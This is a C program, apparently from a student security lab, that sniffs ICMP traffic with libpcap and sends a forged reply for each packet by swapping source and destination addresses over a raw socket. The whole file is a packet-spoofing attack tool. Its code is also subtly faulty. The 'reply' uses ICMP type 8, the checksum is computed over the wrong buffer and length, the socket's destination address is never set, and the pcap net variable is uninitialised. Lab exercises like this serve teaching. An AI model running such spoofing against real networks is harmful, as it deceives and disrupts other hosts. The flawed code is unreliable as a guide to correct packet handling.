#include <pcap.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>


struct ethheader {
	u_char ether_dhost[6];
	u_char ether_shost[6];
	u_short ether_type;
};

struct ipheader {
	unsigned char iph_ihl:4, iph_ver:4;
	unsigned char iph_tos;
	unsigned short int iph_len;
	unsigned short int iph_ident;
	unsigned short int iph_flag:3, iph_offset:13;
	unsigned char iph_ttl;
	unsigned char iph_protocol;
	unsigned short int iph_chksum;
	struct in_addr iph_sourceip;
	struct in_addr iph_destip;
};

struct icmpheader {
	unsigned char icmp_type;
	unsigned char icmp_code;
	unsigned short int icmp_chksum;
	unsigned short int icmp_id;
	unsigned short int icmp_seq;
};


void send_raw_ip_packet(struct ipheader* ip) {
	struct sockaddr_in dest_info;
	int enable = 1;
	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	
	setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));
	dest_info.sin_family = AF_INET;
	sendto(sock, ip, ntohs(ip->iph_len), 0, (struct sockaddr *) & dest_info, sizeof(dest_info));
	close(sock);
}

unsigned short in_cksum(unsigned short *addr, int len) {
	int nleft = len;
	int sum = 0;
	unsigned short *w = addr;
	unsigned short answer = 0;
	
	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}
	
	if (nleft == 1) {
		*(unsigned char *) (&answer) = *(unsigned char *) w;
		sum += answer;
	}
	
	sum = (sum >> 16) + (sum & 0xFFFF);
	sum += (sum >> 16);
	answer = ~sum;
	return (answer);
}

void spoof_reply(struct ipheader* ip) {
	const char buffer[1500];
	int ip_header_len = ip->iph_ihl * 4;
	struct icmpheader* icmp = (struct icmpheader *) ((u_char*) ip + ip_header_len);
	
	memset((char*) buffer, 0, 1500);
	memcpy((char*) buffer, ip, ntohs(ip->iph_len));
	struct ipheader* newip = (struct ipheader *) buffer;
	struct icmpheader* newicmp = (struct icmpheader *) (buffer + ip_header_len);
	char* data = (char*) newicmp + sizeof(struct icmpheader);
	
	const char* msg = "This is a spoofed reply!\n";
	int data_len = strlen(msg);
	strncpy(data, msg, data_len);
	
	newicmp->icmp_type = 8;
	newicmp->icmp_chksum = 0;
	newicmp->icmp_chksum = in_cksum((unsigned short *) icmp, sizeof(struct ipheader));
	
	newip->iph_sourceip = ip->iph_destip;
	newip->iph_destip = ip->iph_sourceip;
	newip->iph_ttl = 50;
	newip->iph_len = htons(sizeof(struct ipheader) + sizeof(struct icmpheader) + data_len);
	
	send_raw_ip_packet(newip);
}

void got_packet(u_char *args, const struct pcap_pkthdr *header,
const u_char *packet) {
	int i = 0;
	int data_size = 0;
	
	struct ethheader *eth = (struct ethheader *) packet;
	
	if(ntohs(eth->ether_type) == 0x0800) {
		struct ipheader * ip = (struct ipheader *) (packet + sizeof(struct ethheader));
		printf("From: %s\n", inet_ntoa(ip->iph_sourceip));
		printf("To: %s\n", inet_ntoa(ip->iph_destip));
		
		switch(ip->iph_protocol) {
			case IPPROTO_TCP:
				printf("Protocol: TCP\n");
				break;
			case IPPROTO_UDP:
				printf("Protocol: UDP\n");
				break;
			case IPPROTO_ICMP:
				printf("Protocol: ICMP\n");
				break;
			default:
				printf("Protocl: Other\n");
				break;
		}
		
		spoof_reply(ip);
	}
}

int main() {
	pcap_t *handle;
	char errbuf[PCAP_ERRBUF_SIZE];
	struct bpf_program fp;
	char filter_exp[] = "ip proto icmp";
	bpf_u_int32 net;
	
	// Step 1: Open live pcap session on NIC with name eth3
	// Students needs to change "eth3" to the name
	// found on their own machines (using ifconfig).
	handle = pcap_open_live("enp0s3", BUFSIZ, 1, 1000, errbuf);
	
	// Step 2: Compile filter_exp into BPF psuedo-code
	pcap_compile(handle, &fp, filter_exp, 0, net);
	pcap_setfilter(handle, &fp);
	
	// Step 3: Capture packets
	pcap_loop(handle, -1, got_packet, NULL);
	pcap_close(handle); //Close the handle
	
	return 0;
}

